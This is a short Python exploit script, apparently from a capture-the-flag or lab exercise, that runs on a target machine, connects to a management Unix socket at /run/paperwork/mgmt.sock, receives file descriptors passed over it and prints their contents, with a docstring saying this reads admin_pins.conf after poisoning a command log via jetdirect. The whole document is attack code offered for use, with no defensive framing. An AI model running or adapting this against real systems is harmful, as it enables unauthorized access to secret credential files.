#!/usr/bin/env python3
"""
Run ON target as user in group archivist (or after you can access mgmt.sock).
1) Poison commands.log with FSQUERY via jetdirect first.
2) Connect mgmt.sock and recvmsg SCM_RIGHTS → read admin_pins.conf
"""
import array
import os
import socket
import sys

SOCK = "/run/paperwork/mgmt.sock"

def main() -> None:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(SOCK)
    ancbuf = socket.CMSG_LEN(32)
    msg, anc, _flags, _addr = s.recvmsg(4096, ancbuf)
    print("msg:", msg.decode(errors="replace"))
    fds = []
    for _cmsg_level, cmsg_type, cmsg_data in anc:
        if cmsg_type == socket.SCM_RIGHTS:
            fds = array.array("i", cmsg_data)
    print("fds:", list(fds))
    for fd in fds:
        try:
            data = os.read(fd, 4096)
            print(f"--- fd {fd} ---")
            print(data.decode(errors="replace"))
        except OSError as e:
            print(f"fd {fd} err: {e}")
        finally:
            try:
                os.close(fd)
            except OSError:
                pass
    s.close()

if __name__ == "__main__":
    main()